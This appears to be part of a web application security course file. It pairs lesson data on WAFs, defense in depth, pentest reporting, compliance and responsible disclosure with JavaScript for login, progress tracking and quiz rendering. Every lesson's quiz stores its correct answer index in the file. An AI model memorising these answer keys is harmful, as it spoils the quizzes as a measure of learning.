                    "overview": "A Web Application Firewall (WAF) is a network-based security control that provides a critical layer of defense for your applications. This lesson covers how to effectively use a WAF to block common attacks and manage malicious traffic.",
                    "sections": [
                        {
                            "title": "WAF as a Virtual Patch",
                            "content": "<p>A WAF sits in front of your web application and inspects all HTTP traffic. While you should always fix vulnerabilities in your code, a WAF can act as a 'virtual patch'. For example, if a new SQL Injection vulnerability is discovered in your application, you can immediately deploy a WAF rule to block the attack pattern. This gives you immediate protection while your developers work on a permanent fix in the code.</p>",
                            "image": "https://images.unsplash.com/photo-1605379399642-870262d3d051?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary limitation of a WAF?", "options": ["It can fix all security bugs automatically", "It is not a substitute for secure coding; it is a defense-in-depth control that can be bypassed by sophisticated attacks", "It makes applications slower", "It can only detect one type of attack"], "correct": 1, "explanation": "A WAF is a powerful and essential tool, but it should be seen as one layer in a multi-layered defense. The most effective fix is always to remediate the vulnerability in the application's source code." }
                    ]
                }
            },
            {
                "id": "lesson-42-secure-architecture",
                "title": "Lesson 42: Security Architecture Design",
                "duration": "120 min",
                "objectives": [
                    "Apply the principle of defense-in-depth to a web application architecture",
                    "Design secure patterns for authentication, session management, and access control",
                    "Focus on reducing the overall attack surface of an application"
                ],
                "content": {
                    "overview": "This lesson brings together all the defensive concepts to focus on how to design a secure application architecture from the ground up, following the principle of security by design.",
                    "sections": [
                        {
                            "title": "Defense in Depth",
                            "content": "<p>Defense in Depth is the principle that you should have multiple, layered security controls. The failure of a single control should not lead to a full compromise. For a web application, this means:</p><ul><li>A WAF at the edge.</li><li>A securely configured web server.</li><li>A securely coded application that performs input validation and output encoding.</li><li>A hardened operating system.</li><li>A secure database with limited privileges.</li><li>Comprehensive logging and monitoring.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "The principle of having multiple layers of security controls is known as:", "options": ["Single Point of Failure", "Defense in Depth", "Principle of Least Privilege", "Shifting Left"], "correct": 1, "explanation": "Defense in Depth ensures that if one control fails, another one is in place to stop or slow down an attack." }
                    ]
                }
            },
            {
                "id": "lesson-43-reporting",
                "title": "Lesson 43: Vulnerability Assessment Reporting",
                "duration": "120 min",
                "objectives": [
                    "Write a professional, high-quality technical security report",
                    "Create a concise, non-technical executive summary that communicates risk",
                    "Provide clear, actionable remediation guidance to developers"
                ],
                "content": {
                    "overview": "The final deliverable of any security assessment is the report. Your technical skills are wasted if you cannot clearly communicate your findings and their business impact. This lesson covers how to write a professional security report that is valuable for both technical and leadership audiences.",
                    "sections": [
                        {
                            "title": "Report Structure",
                            "content": "<h3>Key Sections:</h3><ol><li><strong>Executive Summary:</strong> A high-level overview for leadership. State the overall risk level and the most critical findings in non-technical business terms.</li><li><strong>Scope and Methodology:</strong> What was tested and how it was tested.</li><li><strong>Findings:</strong> The detailed, technical description of each vulnerability. For each finding, you must include:<ul><li>**Title and Risk Rating:** (e.g., 'Critical - Stored Cross-Site Scripting').</li><li>**Description:** A clear explanation of the vulnerability.</li><li>**Proof of Concept:** Step-by-step instructions, including code and screenshots, to reproduce the vulnerability. This is the most important part for the development team.</li><li>**Impact:** The business impact of the vulnerability.</li><li>**Remediation:** Clear, actionable guidance on how to fix the vulnerability.</li></ul></li><li><strong>Conclusion:</strong> A final summary of the security posture.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the most important component of a vulnerability finding for a developer who needs to fix it?", "options": ["The risk rating", "The executive summary", "The detailed, step-by-step proof of concept", "The name of the tester"], "correct": 2, "explanation": "The proof of concept provides the developer with a repeatable test case that allows them to see the vulnerability for themselves, understand it, and then validate that their fix has been successful." }
                    ]
                }
            },
            {
                "id": "lesson-44-remediation-planning",
                "title": "Lesson 44: Remediation Planning",
                "duration": "120 min",
                "objectives": [
                    "Prioritize vulnerability fixes based on risk and effort",
                    "Allocate resources and develop a timeline for remediation",
                    "Plan for and execute validation testing to confirm fixes"
                ],
                "content": {
                    "overview": "Finding vulnerabilities is only half the battle. This lesson covers the post-assessment process of remediation planning, focusing on how to work with development teams to prioritize and fix the vulnerabilities that matter most.",
                    "sections": [
                        {
                            "title": "Prioritization Strategies",
                            "content": "<p>You cannot fix everything at once. Prioritization must be based on risk. A common model is to plot vulnerabilities on a matrix of **Likelihood vs. Impact**. The most critical vulnerabilities are those that are both easy for an attacker to exploit and would have a severe business impact if they were. These must be fixed first.</p>",
                            "image": "https://images.unsplash.com/photo-1542626991-cbc4e32524cc?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "The primary factor that should drive the prioritization of vulnerability remediation is:", "options": ["How easy the vulnerability is to fix", "The risk it poses to the business (a function of likelihood and impact)", "Which developer wrote the code", "The date it was found"], "correct": 1, "explanation": "A risk-based approach ensures that you are always working on the most important problems first." }
                    ]
                }
            },
            {
                "id": "lesson-45-security-metrics",
                "title": "Lesson 45: Security Metrics and KPIs",
                "duration": "120 min",
                "objectives": [
                    "Develop a metrics program to measure the effectiveness of your security program",
                    "Track vulnerability trends over time",
                    "Measure key KPIs like 'Time to Remediate'"
                ],
                "content": {
                    "overview": "'You can't improve what you don't measure.' This lesson covers how to develop a metrics-driven application security program, allowing you to track progress, demonstrate value, and make data-driven decisions about your security investments.",
                    "sections": [
                        {
                            "title": "Key Metrics",
                            "content": "<ul><li><strong>Time to Remediate (Critical Vulnerabilities):</strong> The average time it takes from when a critical vulnerability is reported to when it is fixed. This is a primary Key Performance Indicator (KPI) for the effectiveness of your AppSec program.</li><li><strong>Vulnerability Density:</strong> The number of vulnerabilities found per thousand lines of code. This can help identify which applications are the most problematic.</li><li><strong>Open Vulnerability Trends:</strong> A graph showing the number of open critical, high, medium, and low vulnerabilities over time. Your goal is to see the number of critical and highs trending down.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is 'Time to Remediate'?", "options": ["How long it takes to find a vulnerability", "The time from when a vulnerability is reported to when it is successfully fixed", "How long it takes to write a security report", "The amount of time a developer spends on security"], "correct": 1, "explanation": "This is a key metric that measures the efficiency and effectiveness of your entire vulnerability management lifecycle." }
                    ]
                }
            },
            {
                "id": "lesson-46-compliance-mapping",
                "title": "Lesson 46: Compliance Mapping",
                "duration": "120 min",
                "objectives": [
                    "Map the OWASP Top 10 vulnerabilities to common compliance frameworks",
                    "Understand how vulnerabilities like SQL injection and XSS affect your PCI DSS compliance",
                    "Use the OWASP Top 10 as a tool for compliance reporting and gap analysis"
                ],
                "content": {
                    "overview": "Many compliance frameworks have specific requirements related to web application security. This lesson shows how the OWASP Top 10 aligns with these requirements and how you can use an OWASP-based assessment to provide evidence for a compliance audit.",
                    "sections": [
                        {
                            "title": "Mapping to PCI DSS",
                            "content": "<p>The Payment Card Industry Data Security Standard (PCI DSS) has a direct and explicit requirement (Requirement 6.5) to develop applications based on secure coding guidelines and to protect them against the OWASP Top 10 vulnerabilities. A thorough OWASP Top 10 assessment is a core part of achieving and maintaining PCI DSS compliance.</p>",
                            "image": "https://images.unsplash.com/photo-1579873436214-a4b5683938a4?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Which major compliance framework explicitly requires that applications be protected against the OWASP Top 10?", "options": ["GDPR", "HIPAA", "SOX", "PCI DSS"], "correct": 3, "explanation": "PCI DSS Requirement 6.5 directly references the OWASP Top 10, making an OWASP assessment a key activity for any organization that handles credit card data." }
                    ]
                }
            },
            {
                "id": "lesson-47-industry-security",
                "title": "Lesson 47: Industry-Specific Security",
                "duration": "120 min",
                "objectives": [
                    "Explore the unique security requirements of financial services applications",
                    "Understand the security and privacy needs of healthcare applications (HIPAA)",
                    "Analyze the threat models for e-commerce and government applications"
                ],
                "content": {
                    "overview": "While the OWASP Top 10 applies broadly, different industries have unique threat models and regulatory pressures. This lesson explores the specific security considerations for applications in the finance, healthcare, and e-commerce sectors.",
                    "sections": [
                        {
                            "title": "Healthcare Application Security",
                            "content": "<p>For healthcare applications, the primary concern is protecting Protected Health Information (PHI) as required by HIPAA. This means that access control vulnerabilities (A01 - Broken Access Control) take on an even greater significance. A horizontal privilege escalation (IDOR) that allows one patient to see another patient's data is not just a bug; it is a major data breach with severe legal consequences.</p>",
                            "image": "https://images.unsplash.com/photo-1538692125883-909953930b5e?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "In a healthcare application, an IDOR vulnerability that exposes one patient's data to another is a violation of what regulation?", "options": ["PCI DSS", "SOX", "HIPAA", "None of the above"], "correct": 2, "explanation": "HIPAA is the primary US law governing the privacy and security of health information, and this type of breach is a direct violation." }
                    ]
                }
            },
            {
                "id": "lesson-48-emerging-threats",
                "title": "Lesson 48: Emerging Threat Landscape",
                "duration": "120 min",
                "objectives": [
                    "Understand how to stay current with new vulnerabilities and attack techniques",
                    "Explore the potential impact of AI/ML on web application security",
                    "Consider future threats from technologies like quantum computing"
                ],
                "content": {
                    "overview": "The threat landscape is never static. This lesson looks to the future, discussing the emerging attack vectors and technologies that will shape the next generation of web application security.",
                    "sections": [
                        {
                            "title": "AI/ML Security",
                            "content": "<p>As AI and Machine Learning models are integrated into applications, they create a new attack surface. Attackers are now researching 'adversarial AI' attacks, where they can craft special inputs to fool a machine learning model, or attacks that can poison the training data to create a hidden backdoor in the model itself.</p>",
                            "image": "https://images.unsplash.com/photo-1620712943543-959bab121695?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why is it important for a security professional to engage in continuous learning?", "options": ["It is not important", "The threat landscape and technology are constantly evolving, and a professional's skills must evolve with them", "To collect as many certifications as possible", "To impress their boss"], "correct": 1, "explanation": "Application security is a field where you must be a lifelong learner to remain effective." }
                    ]
                }
            },
            {
                "id": "lesson-49-bug-bounty",
                "title": "Lesson 49: Bug Bounty and Responsible Disclosure",
                "duration": "120 min",
                "objectives": [
                    "Understand how bug bounty programs work",
                    "Learn the principles of responsible disclosure",
                    "Know how to write a high-quality vulnerability report for a bug bounty program"
                ],
                "content": {
                    "overview": "Bug bounty programs provide a way for companies to harness the power of the global security research community to find vulnerabilities in their applications. This lesson covers how these programs work and the ethics of responsible disclosure.",
                    "sections": [
                        {
                            "title": "Responsible Disclosure",
                            "content": "<p>Responsible (or coordinated) disclosure is the ethical principle that when a security researcher finds a vulnerability, they should privately report it to the company and give them a reasonable amount of time to fix it before they disclose it publicly. This allows the company to protect its users while still allowing the researcher to share their findings with the community for the benefit of all.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is responsible disclosure?", "options": ["Immediately posting a vulnerability on Twitter", "Privately reporting a vulnerability to the vendor and allowing them time to fix it before public disclosure", "Selling the vulnerability on the dark web", "Ignoring the vulnerability"], "correct": 1, "explanation": "This ethical framework is the standard for the security research community, balancing the need to share knowledge with the need to protect users." }
                    ]
                }
            },
            {
                "id": "lesson-50-final-capstone-project",
                "title": "Lesson 50: Final Capstone Project",
                "duration": "240 min",
                "objectives": [
                    "Conduct a comprehensive, hands-on security assessment of a complex web application",
                    "Identify and exploit a chain of vulnerabilities from multiple OWASP Top 10 categories",
                    "Produce a professional-quality, end-to-end security assessment report and deliverable package"
                ],
                "content": {
                    "overview": "The final capstone is a comprehensive, hands-on project that requires you to synthesize every skill learned in this program. You will be given access to a complex, multi-functional vulnerable web application. Your mission is to perform a full security assessment, find and exploit multiple vulnerabilities, and produce a professional penetration test report.",
                    "sections": [
                        {
                            "title": "The Final Assessment",
                            "content": "<p><strong>The Task:</strong> You are a penetration tester hired to assess a new social media platform. The platform includes user profiles, a private messaging system, and an admin interface. It is known to contain vulnerabilities across multiple OWASP Top 10 categories.</p><h3>Your Mission:</h3><ol><li><strong>Reconnaissance and Mapping:</strong> Fully map the application's functionality.</li><li><strong>Identify and Exploit:</strong> Find and exploit a chain of vulnerabilities. Your goal is to start as a new, unprivileged user and find a way to become an administrator and read the private messages of other users.</li><li><strong>Reporting:</strong> Produce a full, professional-quality penetration test report. The report must include a non-technical executive summary and detailed, reproducible technical findings for each vulnerability, along with actionable remediation advice.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 100,
                    "questions": [
                        { "id": 1, "question": "The capstone project is designed to assess your ability to:", "options": ["Answer multiple choice questions", "Write a single firewall rule", "Synthesize knowledge from the entire course to conduct a comprehensive, hands-on web application security assessment from start to finish", "Restart a web server"], "correct": 2, "explanation": "This project is the ultimate test, requiring you to apply your knowledge in a practical and holistic way to solve a complex, realistic security assessment challenge." }
                    ]
                }
            }
        ]
    }


      // =====================================================
      // GLOBAL VARIABLES
      // =====================================================
      let currentUser = null;
      let currentLessonIndex = 0;
      let courseProgress = {};
      let userStats = {};
      let quizState = {
        currentQuestion: 0,
        answers: [],
        score: 0,
        isComplete: false,
      };

      // Enhanced session tracking
      let courseSession = {
        startTime: null,
        totalStudyTime: 0,
        lessonsStarted: 0,
        lessonsCompleted: 0,
        pageLoadTime: new Date(),
        interactionCount: 0,
        lastActivityTime: new Date(),
      };

      // Music Player Variables
      let audioPlayer = new Audio();

      // Achievement notification system
      let notificationQueue = [];
      let isShowingNotification = false;

      // =====================================================
      // INITIALIZATION
      // =====================================================
      document.addEventListener("DOMContentLoaded", async () => {
        try {
          showLoadingScreen();
          await checkAuth();

          if (currentUser) {
            // Initialize session tracking
            startCourseSession();

            // Load course data and progress
            await loadCourseData();
            await loadUserProfile();
            await loadProgress();

            // Initialize UI
            initializeEventListeners();
            renderSidebar();
            loadLesson(currentLessonIndex);

            // Initialize additional features
            initMusicPlayer();
            addMusicIndicator();
            initializeActivityTracking();

            hideLoadingScreen();
          } else {
            openAuthModal();
          }
        } catch (error) {
          console.error("Error initializing course:", error);
          hideLoadingScreen();
          showToast("Failed to initialize course system", "error");
        }
      });

      // =====================================================
      // AUTHENTICATION SYSTEM
      // =====================================================
      async function checkAuth() {
        try {
          const {
            data: { session },
            error,
          } = await supabase.auth.getSession();

          if (error) {
            console.error("Auth error:", error);
            currentUser = null;
            openAuthModal();
            return;
          }

          if (!session) {
            currentUser = null;
            openAuthModal();
            return;
          }

          currentUser = session.user;
          updateUIWithUser();
        } catch (error) {
          console.error("Error checking auth:", error);
          currentUser = null;
          openAuthModal();
        }
      }

      function updateUIWithUser() {
        if (!currentUser) return;

        const name =
          currentUser.user_metadata?.full_name ||
          currentUser.email.split("@")[0];
        const userElements = document.querySelectorAll("[data-user-name]");
        userElements.forEach((el) => (el.textContent = name));
      }

      // =====================================================
      // USER PROFILE & STATS MANAGEMENT
      // =====================================================
      async function loadUserProfile() {
        try {
          //  Step 1: Try to fetch existing profile
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("*")
            .eq("id", currentUser.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (!profile) {
            //  Step 2: Create new profile if missing
            await createUserProfile();
          } else {
            //  Step 3: Use existing profile
            userStats = profile;
            await updateLastActivity();
          }
        } catch (error) {
          console.error(" Error loading user profile:", error);
          showToast("Failed to load user profile", "error");
        }
      }
      async function createUserProfile() {
        try {
          const newProfile = {
            id: currentUser.id,
            full_name: currentUser.user_metadata?.full_name || "",
            email: currentUser.email,
            level: "Script Kiddie",
            total_points: 0,
            completed_courses: 0,
            current_streak: 0,
            total_certificates: 0,
            total_achievements: 0,
            sections_visited: 0,
            bonus_points: 0,
            in_progress_courses: 0,
            settings_changed: 0,
            midnight_sessions: 0,
            early_sessions: 0,
            weekend_sessions: 0,
            last_activity: new Date().toISOString(),
            created_at: new Date().toISOString(),
          };

          const { error } = await supabase
            .from("profiles")
            .insert([newProfile]);

          if (!error) {
            userStats = newProfile;
            // Award first login achievement
            setTimeout(() => checkAndUnlockAchievement("first_login"), 1000);
          }
        } catch (error) {
          console.error("Error creating user profile:", error);
        }
      }

      async function updateLastActivity() {
        try {
          const now = new Date();

          // Update activity tracking
          courseSession.lastActivityTime = now;

          // Update database
          await supabase
            .from("profiles")
            .update({
              last_activity: now.toISOString(),
            })
            .eq("id", currentUser.id);

          // Check time-based achievements
          await checkTimeBasedAchievements(now);
        } catch (error) {
          console.error("Error updating last activity:", error);
        }
      }

      // =====================================================
      // COURSE SESSION MANAGEMENT
      // =====================================================
      function startCourseSession() {
        courseSession.startTime = new Date();
        courseSession.pageLoadTime = new Date();

        logUserActivity("course_session_start", {
          course_id: COURSE_DATA.id,
          course_title: COURSE_DATA.title,
          user_agent: navigator.userAgent,
          screen_resolution: `${screen.width}x${screen.height}`,
        });

        // Check daily streak
        checkDailyStreak();
      }

      function initializeActivityTracking() {
        // Track page focus/blur for accurate study time
        document.addEventListener("visibilitychange", handleVisibilityChange);

        // Track user interactions
        ["click", "keydown", "scroll", "mousemove"].forEach((event) => {
          document.addEventListener(event, trackUserInteraction, {
            passive: true,
          });
        });

        // Periodic activity updates
        setInterval(updateStudyTime, 60000); // Every minute

        // Save session data before page unload
        window.addEventListener("beforeunload", saveSessionData);
      }

      function handleVisibilityChange() {
        if (document.hidden) {
          courseSession.lastActivityTime = new Date();
        } else {
          // Page became visible again - update activity
          updateLastActivity();
        }
      }

      function trackUserInteraction() {
        courseSession.interactionCount++;
        courseSession.lastActivityTime = new Date();

        // Throttle activity updates
        if (courseSession.interactionCount % 50 === 0) {
          updateLastActivity();
        }
      }

      function updateStudyTime() {
        if (!courseSession.startTime || document.hidden) return;

        const now = new Date();
        const sessionDuration = now - courseSession.startTime;
        courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes

        // Update progress with study time
        saveProgress();
      }

      function saveSessionData() {
        if (!currentUser || !courseSession.startTime) return;

        const sessionData = {
          user_id: currentUser.id,
          course_id: COURSE_DATA.id,
          session_duration: courseSession.totalStudyTime,
          lessons_viewed: courseSession.lessonsStarted,
          lessons_completed: courseSession.lessonsCompleted,
          interactions: courseSession.interactionCount,
          session_date: courseSession.startTime.toISOString().split("T")[0],
        };

        // Store in localStorage as backup
        localStorage.setItem(
          "course_session_backup",
          JSON.stringify(sessionData)
        );

        // Try to save to database
        logUserActivity("course_session_end", sessionData);
      }

      // =====================================================
      // COURSE DATA & PROGRESS MANAGEMENT
      // =====================================================
      async function loadCourseData() {
        try {
          // Update course info in UI
          document.getElementById("courseTitle").textContent =
            COURSE_DATA.title;
          document.getElementById("totalLessons").textContent =
            COURSE_DATA.lessons.length;

          // Log course access
          logUserActivity("course_access", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
          });
        } catch (error) {
          console.error("Error loading course data:", error);
        }
      }

      async function loadProgress() {
        try {
          // Get existing progress from database
          const { data, error } = await supabase
            .from("course_progress")
            .select("*")
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (data) {
            courseProgress = JSON.parse(data.lesson_progress || "{}");
            currentLessonIndex = data.current_lesson || 0;

            // Update session tracking
            courseSession.lessonsStarted = Object.keys(courseProgress).length;
            courseSession.lessonsCompleted = Object.values(
              courseProgress
            ).filter((p) => p.completed).length;
          } else {
            // Initialize new progress
            courseProgress = {};
            currentLessonIndex = 0;
            await saveProgress();

            // Award first course start achievement
            await checkAndUnlockAchievement("first_course_start");
          }

          updateProgressDisplay();
        } catch (error) {
          console.error("Error loading progress:", error);
          showToast("Failed to load progress", "error");
        }
      }

      async function saveProgress() {
        try {
          if (!currentUser) return;

          const now = new Date();
          const progressData = {
            user_id: currentUser.id,
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            current_lesson: currentLessonIndex,
            lesson_progress: JSON.stringify(courseProgress),
            progress: calculateOverallProgress(),
            lessons_completed: getCompletedLessonsCount(),
            lessons_started: Object.keys(courseProgress).length,
            study_time_minutes: courseSession.totalStudyTime,
            last_accessed: now.toISOString(),
            updated_at: now.toISOString(),
          };

          // Upsert progress
          const { error } = await supabase
            .from("course_progress")
            .upsert([progressData]);

          if (error) throw error;

          // Update user stats
          await updateUserStats();

          updateProgressDisplay();
        } catch (error) {
          console.error("Error saving progress:", error);
          showToast("Failed to save progress", "error");
        }
      }

      async function updateUserStats() {
        try {
          // Get all course progress for this user
          const { data: allProgress, error } = await supabase
            .from("course_progress")
            .select("progress, course_id, study_time_minutes")
            .eq("user_id", currentUser.id);

          if (error) throw error;

          // Calculate stats
          const completedCourses =
            allProgress?.filter((p) => p.progress >= 100).length || 0;
          const inProgressCourses =
            allProgress?.filter((p) => p.progress > 0 && p.progress < 100)
              .length || 0;
          const totalStudyTime =
            allProgress?.reduce(
              (sum, p) => sum + (p.study_time_minutes || 0),
              0
            ) || 0;

          // Calculate points (500 per completed course + achievement points)
          const coursePoints = completedCourses * 500;
          const bonusPoints = userStats.bonus_points || 0;
          const totalPoints = coursePoints + bonusPoints;

          // Update profile
          const updateData = {
            completed_courses: completedCourses,
            in_progress_courses: inProgressCourses,
            total_points: totalPoints,
            total_study_time: totalStudyTime,
            last_activity: new Date().toISOString(),
          };

          const { error: updateError } = await supabase
            .from("profiles")
            .update(updateData)
            .eq("id", currentUser.id);

          if (updateError) throw updateError;

          // Update local stats
          Object.assign(userStats, updateData);
        } catch (error) {
          console.error("Error updating user stats:", error);
        }
      }

      function calculateOverallProgress() {
        const completedLessons = getCompletedLessonsCount();
        return Math.round(
          (completedLessons / COURSE_DATA.lessons.length) * 100
        );
      }

      function getCompletedLessonsCount() {
        return Object.values(courseProgress).filter(
          (lesson) => lesson.completed
        ).length;
      }

      function updateProgressDisplay() {
        const completedCount = getCompletedLessonsCount();
        const progressPercent = calculateOverallProgress();

        // Update UI elements
        const elements = {
          completedLessons: completedCount,
          courseProgressPercent: `${progressPercent}%`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });

        // Update progress bar
        const progressBar = document.getElementById("courseProgressFill");
        if (progressBar) progressBar.style.width = `${progressPercent}%`;
      }

      // =====================================================
      // LESSON MANAGEMENT
      // =====================================================
      function loadLesson(index) {
        if (index < 0 || index >= COURSE_DATA.lessons.length) return;

        const lesson = COURSE_DATA.lessons[index];
        currentLessonIndex = index;

        // Mark lesson as started and track activity
        if (!courseProgress[lesson.id]) {
          courseProgress[lesson.id] = {
            started: true,
            completed: false,
            startedAt: new Date().toISOString(),
            timeSpent: 0,
          };

          courseSession.lessonsStarted++;
          saveProgress();

          // Log lesson start
          logUserActivity("lesson_start", {
            lesson_id: lesson.id,
            lesson_title: lesson.title,
            lesson_index: index,
          });
        }

        // Update lesson start time for time tracking
        courseProgress[lesson.id].currentSessionStart = new Date();

        // Update sidebar and navigation
        renderSidebar();
        updateNavigationButtons();

        // Update header info
        updateLessonHeader(lesson, index);

        // Render lesson content
        renderLessonContent(lesson);

        // Smooth scroll and animations
        window.scrollTo({ top: 0, behavior: "smooth" });
        document.getElementById("contentBody").scrollTop = 0;

        const contentBody = document.getElementById("contentBody");
        contentBody.classList.add("fade-in");
        setTimeout(() => contentBody.classList.remove("fade-in"), 500);

        // Check lesson-based achievements
        checkLessonAchievements(index + 1);
      }

      function updateLessonHeader(lesson, index) {
        const elements = {
          currentLessonNumber: index + 1,
          currentLessonTitle: lesson.title,
          navInfo: `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });
      }

      function renderSidebar() {
        const lessonNav = document.getElementById("lessonNav");
        if (!lessonNav) return;

        lessonNav.innerHTML = "";

        COURSE_DATA.lessons.forEach((lesson, index) => {
          const lessonItem = document.createElement("div");
          lessonItem.className = "lesson-item";

          // Determine lesson status
          const lessonProgress = courseProgress[lesson.id];
          const isCompleted = lessonProgress?.completed || false;
          const isInProgress = lessonProgress?.started || false;
          const isLocked = !isCompleted && !canAccessLesson(index);
          const isActive = index === currentLessonIndex;

          // Apply status classes
          if (isCompleted) lessonItem.classList.add("completed");
          if (isLocked) lessonItem.classList.add("locked");
          if (isActive) lessonItem.classList.add("active");

          // Determine status display
          let statusClass = "not-started";
          let statusIcon = index + 1;

          if (isCompleted) {
            statusClass = "completed";
            statusIcon = "";
          } else if (isInProgress) {
            statusClass = "in-progress";
            statusIcon = "";
          }

          // Create lesson item HTML
          lessonItem.innerHTML = `
            <div class="lesson-status ${statusClass}">${statusIcon}</div>
            <div class="lesson-info">
                <div class="lesson-title">${lesson.title}</div>
                <div class="lesson-meta">
                    ${
                      isCompleted
                        ? "Completed"
                        : isInProgress
                        ? "In Progress"
                        : isLocked
                        ? "Locked"
                        : "Not Started"
                    }
                </div>
            </div>
            <div class="lesson-duration">${lesson.duration}</div>
        `;

          // Add click handler if not locked
          if (!isLocked) {
            lessonItem.addEventListener("click", () => {
              if (index !== currentLessonIndex) {
                // Track lesson time before switching
                trackLessonTime();

                currentLessonIndex = index;
                loadLesson(index);
                closeSidebar();
              }
            });
          }

          lessonNav.appendChild(lessonItem);
        });
      }

      function canAccessLesson(index) {
        if (index === 0) return true; // First lesson always accessible

        // Can access if previous lesson is completed
        const previousLessonId = COURSE_DATA.lessons[index - 1].id;
        return courseProgress[previousLessonId]?.completed || false;
      }

      function trackLessonTime() {
        const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonProgress = courseProgress[currentLesson.id];

        if (lessonProgress?.currentSessionStart) {
          const sessionTime = Math.floor(
            (new Date() - new Date(lessonProgress.currentSessionStart)) /
              1000 /
              60
          );
          lessonProgress.timeSpent =
            (lessonProgress.timeSpent || 0) + sessionTime;
          delete lessonProgress.currentSessionStart;
        }
      }

      // =====================================================
      // LESSON CONTENT RENDERING
      // =====================================================
      function renderLessonContent(lesson) {
        const contentContainer = document.getElementById("lessonContent");
        if (!contentContainer) return;

        let contentHTML = `
        <div class="content-section">
            <h2>Learning Objectives</h2>
            <ul>
                ${lesson.objectives.map((obj) => `<li>${obj}</li>`).join("")}
            </ul>
        </div>
        
        <div class="content-section">
            <h2>Overview</h2>
            <p>${lesson.content.overview}</p>
        </div>
    `;

        // Render content sections
        lesson.content.sections.forEach((section) => {
          contentHTML += `
            <div class="content-section">
                <h2>${section.title}</h2>
                ${section.content}
                ${
                  section.image
                    ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">`
                    : ""
                }
            </div>
        `;
        });

        // Render code examples
        if (
          lesson.content.codeExamples &&
          lesson.content.codeExamples.length > 0
        ) {
          contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;

          lesson.content.codeExamples.forEach((example, index) => {
            const codeId = `code-${lesson.id}-${index}`;
            contentHTML += `
                <div class="code-section">
                    <div class="code-header">
                        <span class="code-title">${example.title}</span>
                        <button class="copy-btn" onclick="copyCode('${codeId}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <pre class="code-block"><code id="${codeId}" class="language-${
              example.language
            }">${escapeHtml(example.code)}</code></pre>
                </div>
            `;
          });
        }

        // Render quiz
        contentHTML += renderQuiz(lesson.quiz);

        contentContainer.innerHTML = contentHTML;

        // Highlight code syntax if Prism is available
        setTimeout(() => {
          if (window.Prism) {
            Prism.highlightAll();
          }
        }, 100);
      }

      // =====================================================
      // QUIZ SYSTEM
      // =====================================================
      function renderQuiz(quiz) {
        const currentLessonProgress =
          courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
        const isCompleted = currentLessonProgress?.completed || false;

        let quizHTML = `
        <div class="quiz-section" id="quizSection">
            <div class="quiz-header">
                <h2 class="quiz-title">
                    <i class="fas fa-clipboard-check"></i>
                    Knowledge Check
                </h2>
                <p class="quiz-info">
                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
                </p>
            </div>
    `;

        if (isCompleted) {
          const savedScore = currentLessonProgress.quizScore || 0;
          quizHTML += `
            <div class="quiz-results show">
                <div class="quiz-score pass">${savedScore}%</div>
                <div class="quiz-message">
                    <strong>Lesson Completed!</strong><br>
                    You've successfully passed this lesson's quiz.
                </div>
            </div>
        `;
        } else {
          // Render quiz questions
          quiz.questions.forEach((question, qIndex) => {
            quizHTML += `
                <div class="quiz-question ${
                  qIndex === 0 ? "active" : ""
                }" data-question="${qIndex}">
                    <div class="question-header">
                        <span class="question-number">Question ${
                          qIndex + 1
                        }</span>
                        <span class="question-progress">${qIndex + 1}/${
              quiz.questions.length
            }</span>
                    </div>
                    <div class="question-text">${question.question}</div>
                    <div class="question-options">
                        ${question.options
                          .map(
                            (option, oIndex) => `
                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
                                <span class="option-letter">${String.fromCharCode(
                                  65 + oIndex
                                )}</span>
                                <span class="option-text">${option}</span>
                            </div>
                        `
                          )
                          .join("")}
                    </div>
                </div>
            `;
          });

          quizHTML += `
            <div class="quiz-controls">
                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
                    <i class="fas fa-chevron-left"></i>
